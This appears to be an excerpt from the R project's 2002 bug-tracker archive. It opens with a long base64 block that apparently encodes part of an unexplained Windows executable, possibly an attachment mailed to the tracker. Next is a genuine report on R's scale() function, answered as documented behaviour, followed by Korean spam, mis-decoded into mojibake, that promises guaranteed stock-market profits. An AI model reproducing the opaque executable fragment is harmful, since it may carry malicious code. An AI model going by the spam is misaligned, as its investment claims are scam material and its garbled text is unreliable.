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
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2209 *
Subject: Function scale
From: Lucas Antoine <lucas@toulouse.inra.fr>
Date: Thu, 24 Oct 2002 14:51:34 +0200 (MET DST)
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2209 <==
From lucas@ossau.toulouse.inra.fr  Thu Oct 24 14:53:13 2002
Received: from ossau.toulouse.inra.fr (ossau.toulouse.inra.fr [193.54.96.73])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA01771
	for <r-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 14:53:12 +0200 (MET DST)
Received: from localhost (lucas@localhost)
	by ossau.toulouse.inra.fr (8.8.8/8.8.8) with ESMTP id OAA07145;
	Thu, 24 Oct 2002 14:51:34 +0200 (MET DST)
Date: Thu, 24 Oct 2002 14:51:34 +0200 (MET DST)
From: Lucas Antoine <lucas@toulouse.inra.fr>
To: r-bugs@biostat.ku.dk
cc: Labourdette Aymeric <labourde@ossau.toulouse.inra.fr>,
        Sylvain Jasson <jasson@ossau.toulouse.inra.fr>
Subject: Function scale
Message-ID: <Pine.SOL.3.95.1021024144412.6803A-100000@ossau.toulouse.inra.fr>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=latin-1
Content-Transfer-Encoding: 8BIT

I found a problem with scale function,
while using center=FALSE and scale=TRUE:

all column are not divided by standard error,
but divided by sqrt (1/(n-1) sum Xi^2 )

Example:
> l<- c(1,2,3)
> scale(l,F,T)
          [,1]
[1,] 0.3779645
[2,] 0.7559289
[3,] 1.1338934
attr(,"scaled:scale")
[1] 2.645751

2.645751 = sqrt( 1/2 * (1+4+9) )


Antoine Lucas & Aymeric Labourdette 

--
Antoine  Lucas        
INRA, Unité de biométrie et     |  Tel 05 61 28 53 34
intelligence artificielle       |  Fax 05 61 28 53 35
http://genopole.toulouse.inra.fr/~lucas


==> 2209.reply.1 <==
From p.dalgaard@biostat.ku.dk  Thu Oct 24 15:28:48 2002
Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id PAA02446;
	Thu, 24 Oct 2002 15:28:47 +0200 (MET DST)
Received: (from pd@localhost)
	by blueberry.kubism.ku.dk (8.11.6/8.11.6) id g9ODSi117559;
	Thu, 24 Oct 2002 15:28:44 +0200
X-Authentication-Warning: blueberry.kubism.ku.dk: pd set sender to p.dalgaard@biostat.ku.dk using -f
To: lucas@toulouse.inra.fr
Cc: r-devel@stat.math.ethz.ch, R-bugs@biostat.ku.dk
Subject: Re: Function scale (PR#2209)
References: <200210241253.OAA01776@pubhealth.ku.dk>
From: Peter Dalgaard BSA <p.dalgaard@biostat.ku.dk>
Date: 24 Oct 2002 15:28:43 +0200
In-Reply-To: <200210241253.OAA01776@pubhealth.ku.dk>
Message-ID: <x265vst184.fsf@biostat.ku.dk>
Lines: 28
User-Agent: Gnus/5.09 (Gnus v5.9.0) Emacs/21.2
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii

lucas@toulouse.inra.fr writes:

> I found a problem with scale function,
> while using center=FALSE and scale=TRUE:
> 
> all column are not divided by standard error,
> but divided by sqrt (1/(n-1) sum Xi^2 )
> 
> Example:
> > l<- c(1,2,3)
> > scale(l,F,T)
>           [,1]
> [1,] 0.3779645
> [2,] 0.7559289
> [3,] 1.1338934
> attr(,"scaled:scale")
> [1] 2.645751
> 
> 2.645751 = sqrt( 1/2 * (1+4+9) )

And? That's exactly what the documentation says will happen. And
exactly what Splus does, even if perhaps surprising.

-- 
   O__  ---- Peter Dalgaard             Blegdamsvej 3  
  c/ /'_ --- Dept. of Biostatistics     2200 Cph. N   
 (*) \(*) -- University of Copenhagen   Denmark      Ph: (+45) 35327918
~~~~~~~~~~ - (p.dalgaard@biostat.ku.dk)             FAX: (+45) 35327907

==> 2209.followup.1 <==
From ben@zoo.ufl.edu  Thu Oct 24 16:18:30 2002
Received: from smtp.ufl.edu (sp11en1.nerdc.ufl.edu [128.227.74.11])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id QAA03191
	for <R-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 16:18:29 +0200 (MET DST)
Received: from bolker.zoo.ufl.edu (bolker.zoo.ufl.edu [10.227.60.45])
	by smtp.ufl.edu (8.12.6/8.12.3/2.3.8) with ESMTP id g9OEHg3w059154;
	Thu, 24 Oct 2002 10:17:43 -0400
Date: Thu, 24 Oct 2002 10:21:22 -0400 (EDT)
From: Ben Bolker <ben@zoo.ufl.edu>
Reply-To: bolker@zoo.ufl.edu
To: lucas@toulouse.inra.fr
cc: R development mailing list <r-devel@stat.math.ethz.ch>,
        <R-bugs@biostat.ku.dk>
Subject: Re: Function scale (PR#2209)
In-Reply-To: <200210241253.OAA01776@pubhealth.ku.dk>
Message-ID: <Pine.LNX.4.44.0210241017370.9918-100000@bolker.zoo.ufl.edu>
MIME-Version: 1.0
Content-Type: TEXT/PLAIN; charset=iso-8859-1
Content-Transfer-Encoding: 8BIT
X-Scanned-By: NERDC Open Systems Group (http://open-systems.ufl.edu/services/virus-scan/)


  The function is behaving as documented ...

   "If `scale' is `TRUE' then scaling is done by dividing the (centered)
    columns of `x' by their root-mean-square, and if `scale' is `FALSE',
    no scaling is done.

   "The root-mean-square for a column is obtained by computing the
    square-root of the sum-of-squares of the non-missing values in the
    column divided by the number of non-missing values minus one."

   It says "root-mean-square", not "standard error" or "standard
deviation".  If you set center=TRUE, then the two are equivalent. If you
*want* it to scale by standard deviation just set scale=sd(l) [or in the
matrix case, scale=apply(l,2,sd)].

  Ben Bolker

On Thu, 24 Oct 2002 lucas@toulouse.inra.fr wrote:

> I found a problem with scale function,
> while using center=FALSE and scale=TRUE:
> 
> all column are not divided by standard error,
> but divided by sqrt (1/(n-1) sum Xi^2 )
> 
> Example:
> > l<- c(1,2,3)
> > scale(l,F,T)
>           [,1]
> [1,] 0.3779645
> [2,] 0.7559289
> [3,] 1.1338934
> attr(,"scaled:scale")
> [1] 2.645751
> 
> 2.645751 = sqrt( 1/2 * (1+4+9) )
> 
> 
> Antoine Lucas & Aymeric Labourdette 
> 
> --
> Antoine  Lucas        
> INRA, Unité de biométrie et     |  Tel 05 61 28 53 34
> intelligence artificielle       |  Fax 05 61 28 53 35
> http://genopole.toulouse.inra.fr/~lucas
> 
> 
> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
> Send "info", "help", or "[un]subscribe"
> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
> 

-- 
318 Carr Hall                                bolker@zoo.ufl.edu
Zoology Department, University of Florida    http://www.zoo.ufl.edu/bolker
Box 118525                                   (ph)  352-392-5697
Gainesville, FL 32611-8525                   (fax) 352-392-3704

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2210 *
Subject: [±¤°í] ±èÄ¡³ÃÀå°í¸¦ ±¸ÀÔÇÏ½Ã¸é ´ýÀ¸·Î ÇÏ³ª ´õ µå¸³´Ï´Ù.
From: È¥¼öÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
Date: Fri, 25 Oct 2002 03:43:56 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2210 <==
From dhdt38nbdhdtydkfhiufhj@hotmail.com  Thu Oct 24 20:44:53 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA04616
	for <R-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 20:44:52 +0200 (MET DST)
Received: from hotmail.com ([211.204.241.162])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9OIhnxB016909
	for <r-bugs@lists.r-project.org>; Thu, 24 Oct 2002 20:44:02 +0200 (MEST)
Message-Id: <200210241844.g9OIhnxB016909@hypatia.math.ethz.ch>
Reply-To: dhdt38nbdhdtydkfhiufhj@hotmail.com
From: È¥¼öÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
To: <r-bugs@stat.math.ethz.ch>
Subject: [±¤°í] ±èÄ¡³ÃÀå°í¸¦ ±¸ÀÔÇÏ½Ã¸é ´ýÀ¸·Î ÇÏ³ª ´õ µå¸³´Ï´Ù.
Sender: È¥¼öÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
Mime-Version: 1.0
Content-Type: text/html; charset="ks_c_5601-1987"
Date: Fri, 25 Oct 2002 03:43:56 +0900
Content-Transfer-Encoding: 8bit

<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=euc-kr">
<title>¾È³çÇÏ¼¼¿ä.</title>
<meta name="generator" content="Namo WebEditor v5.0">
</head>
<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red">
<div align="left">
<table border="1" cellspacing="0" width="648" bordercolor="#cccccc" bordercolordark="white" bordercolorlight="#999999">
    <tr>
        <td width="642" height="2804" bgcolor="#f0f0ff">
                <p><SPAN style="FONT-SIZE: 10pt">¾È³çÇÏ¼¼¿ä. </SPAN></p>
                <p><SPAN style="FONT-SIZE: 10pt">ÁÖ½ÄÅõÀÚÇØ¼­ ¼ÕÇØ¸¦ º¸¼Ì´ø ºÐÀÌ¶ó¸é Àû±Ø ±ÇÀåÇÏ´Â ºñ¹ýÀÌ ÀÖ½À´Ï´Ù. 
                È¨ÆäÀÌÁö ÁÂÃø¿¡ ÁÖ½ÄÅõÀÚºñ¹ý °Ô½ÃÆÇ¿¡ µé¾î¿À¼Å¼­ °Ô½ÃÆÇ¿¡ ¾î¶² Áú¹®ÀÌµçÁö &nbsp;³²±â½Ã¸é ¼º½É²¯ ´äº¯ÇØµå¸³´Ï´Ù. 
                ÁÖ½ÄÅõÀÚ¿¡ ÃÊº¸ÀÚ ºÐµéÀÌ³ª ¼ÕÇØ¸¦ º¸½ÅºÐµéÀÌ¶ó¸é ²À µé¾î¿À¼¼¿ä^^</SPAN></p>
      <P><SPAN style="FONT-SIZE: 10pt">·Î±×ÀÎ ÇÏ½ÅÈÄ ÁÖ½ÄÅõÀÚºñ¹ý Å¬¸¯ÈÄ ÀÚ¼¼È÷ º¸±â¸¦&nbsp;Å¬¸¯ÇÏ½Ã¸é µ¿¿µ»ó »ùÇÃÀ» º¸½Ç¼ö ÀÖ±¸¿ä. 
                ±×¸®°í ÁÖ½ÄÅõÀÚÀÌ¾ß±â¸¦ Å¬¸¯ÇÏ¼Å¼­ ±¸Ã¼ÀûÀ¸·Î Áú¹®ÇØÁÖ½Ã¸é&nbsp;ÀÚ¼¼ÇÏ°Ô ´äº¯ÇØµå¸³´Ï´Ù.</SPAN></P>
      <P><SPAN style="FONT-SIZE: 10pt">¹é¸¸ÀåÀÚ Å¬·´ÀÇ ÁÖ½ÄÅõÀÚ Å¬·´Àº ÁÖ½Ä¿¡ °ü½ÉÀÖ´Â ºÐµé¸¸ÀÇ Ä¿¹Â´ÏÆ¼ 
      °ø°£ÀÔ´Ï´Ù. ¹«·á È¸¿ø °¡ÀÔÇÏ½Ã°í Âß µÑ·¯ º¸¼¼¿ä. ±×¸®°í ¸¹Àº À¯ÀÍÇÑ Á¤º¸¸¦ ¾ò¾î°¡½Ã±æ º÷´Ï´Ù. <BR><BR></SPAN>
<P><A href="http://lycos.starhana.com" target="_blank"><FONT color="blue"><b>ÁÖ½ÄÅõÀÚ È¨ÆäÀÌÁö 
µé¾î¿À±â</b></FONT></A></P>
     
      <P><SPAN style="FONT-SIZE: 10pt">¹é¸¸ÀåÀÚÅ¬·´¿¡¼­¿¡¼­ Á¦°øÇÏ´Â ÁÖ½ÄÅõÀÚ¹ýÀº ¹Ì±¹ÀÇ ÁÖ½Ä ÄÁ¼³´øÆ® 1À§ÀÎ 
      15¼¼ ¼Ò³âÀÌ ÀÏºÎ ¿î¿ëÇÏ°í ÀÖ´Â ¹æ¹ýÀ¸·Î¼­, <FONT color=blue>´Ù¸¶½º ¼±»ý´ÔÀÌ ÁÖ½Ä°Å·¡ÀÇ ¾Ë°í¸®ÁòÀ» ºÐ¼®ÇÏ¿© ÀÏ»ýÀÇ 
      °ø·ÂÀ» ±â¿ï¿© Á¤¸®ÇÑ Æ¯º°ÇÑ ÁÖ½ÄÅõÀÚÀÇ ºñ¹ý ÀÔ´Ï´Ù.</FONT><BR><BR>ÀÌ&nbsp;ºñ¹ýÀº °úÇÐÀûÀÔ´Ï´Ù. µû¶ó¼­ ¿øÄ¢À» 
      ÀÌÇØÇÏ¸é ´©±¸³ª ¼Õ½Ç¾øÀÌ ¼öÀÍÀ» ³¾ ¼ö ÀÖ´Â ºñ¹ýÀÔ´Ï´Ù. ±×¸®°í ÀÌ ºñ¹ýÀ» ÀÍÈ÷¸é ÁÖ½ÄÅõÀÚ¸¸À¸·Î ¹é¸¸ÀåÀÚÀÇ ²ÞÀ» ÀÌ·ç½Ç¼ö 
      ÀÖ½À´Ï´Ù.</SPAN><span style="FONT-SIZE: 10pt"><br></span></P>
            <p><span style="FONT-SIZE: 10pt">¢º ³» ¿ë : ÃÑ 228 °­ÁÂ, 5,000 ºÐ 
            ºÐ·®ÀÇ µ¿¿µ»ó °­ÁÂ ½Ãµð 15 ¸Å</span></p>
            <p><span style="FONT-SIZE: 10pt">¢º °­ÀÇ ³»¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">1°­. ¹«Á¶°Ç 
            ¼öÀÍ³¾¼ö ÀÖ´Â ¹æ¹ý1<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">2°­. ¾×¸éº´ÇÕ°ú 
            °¨ÀÚ·Î ¼öÀÍ³»±â<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">3°­.ÁÖ½Ä 
            ½Ã°£Â÷ °ø°Ý1<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">4°­.¾Ö³ÎÀÇ 
            µÎ ¾ó±¼À» ÀÌ¿ëÇÑ ½ÇÀüÀÌÀÍ³»±â<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">5°­.ÇÑÁ¾¸ñÀ¸·Î 
            1³â ¼öÀÍ³»±â </span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">6°­.½ÇÀü±ÞµîÁ¶°Ç°ú 
            ¾ÆÁîÅØwb</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">7°­.°ü¸®Á¾¸ñ´Ù·ç±â 
            1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">8°­.¿ì·®ÁÖ´Ù·ç±â 
            1.(¿ì·®ÁÖ·Î¼öÀÍ³»±â)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">9°­.¼¼·ÂÁÖ 
            °£´ÜÃ£±â 1.</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">10°­. 
            ¿ì·®ÁÖ´Ù·ç±â 2.</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">11°­. 
            ¼¼·ÂÁÖ °£´ÜÃ£±â(2)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">12°­. 
            µ¥ÀÌÆ®·¹ÀÌµùÀ¸·Î ¹«Á¶°Ç ¼öÀÍ³»´Â¹ý(80%½Â·ü µ¥ÀÌ&amp;½ºÄ¶ÇÎ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">13°­. 
            ´Ü±â,Áß±â ¹«Á¶°Ç¼öÀÍ³»±â À§ÇÑ °¢Àç·á ´Ù·ç´Â ¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">14°­. 
            »óÇÑ°¡ Ã¼°á°­µµ ÃøÁ¤Ç¥</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">15°­. 
            ÁöÁö¿Í ÀúÇ×À» ÀÌ¿ëÇÑ ½ÇÀü ¾Ë°í¸®Áò ÀÐ±â(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">16°­.³Ñ 
            Àç¹Õ´Â 1³â¿¡ ´ÜÇÏ·ç ¼±¹°, ÁÖ½Ä ¹«Á¶°Ç ¼öÀÍ³ª´Â ³¯</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">17°­. 
            ¼¼·ÂÁÖ°£´ÜÃ£±â(3)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">18°­.½ÇÀü 
            ±ÞµîÆÐÅÏ (1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">19°­. 
            °³¹Ì¸¦ À§ÇÑ ÀÚ»ê¿î¿ë¹ý(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">20°­. 
            ÇÏÇÑ°¡ Àü·«(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">21°­.»ó½ÂÆÐÅÏ 
            1,2,3,4</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">22°­.»óÇÑ°¡Àü·« 
            (1) - TÀÚ »óÇÑÀâ±â-´Ù¿î·ÎµåÇÏ¼¼¿ä</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">23°­. 
            ¸Å¹°ºÎ´ãÂ÷Æ®¸¦ ÀÌ¿ëÇÑ ±ÞµîÆÐÅÏ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">24°­. 
            ¼¼·ÂÁÖ °£´ÜÃ£±â(4)-ÄµµéÀÌ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">25°­. 
            Æø¶ôÀå¿¡¼­ ¼öÀÍ³ª´Â ÇÊ¼öÁ¾¸ñ (1) ¼Ò¾×ÅõÀÚ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">26°­.µ¹ÆÄÀÇ 
            ½Å·Úµµ ÃøÁ¤(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">27°­.¾Ë°í¸®Áò(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">28°­. 
            ¾Ë°í¸®Áò(2) °Å·¡·®1,OBVÀÇ ¸ÍÁ¡</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">29°­.¾Ë°í¸®Áò(3) 
            °¢µµ¿Í ½É¸®1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">30°­. 
            ¾Ë°í¸®Áò(4) ÀÌÆò-¼ö·Å-»ó½Â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">31°­.¾îµð¿¡µµ 
            ³ª¿ÀÁö ¾Ê´Â ³Ñ Áø±ÍÇÏ°í ´Ü¼øÇÑ ±ÞµîÆÐÅÏ ÇÏ³ª(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">32°­. 
            ¹Ýµî°ú ¹Ý¶ôÀÇ ¾Ë°í¸®Áò</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­.½ÇÀü´ÜÅ¸¿¡¼­ 
            º¸Á¶ÁöÇ¥ÀÌ¿ë¹ý(1)-TRIX1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­-2 
            ½ÇÀüº¸Á¶ÁöÇ¥ÀÌ¿ë¹ý TRIX2-ÀÏºÀÀ» ÀÌ¿ëÇÑ ¼öÀÍ·ü ±Ø´ëÈ­ ÇÏ±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­-3 
            TRIX¶õ?</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">34°­. 
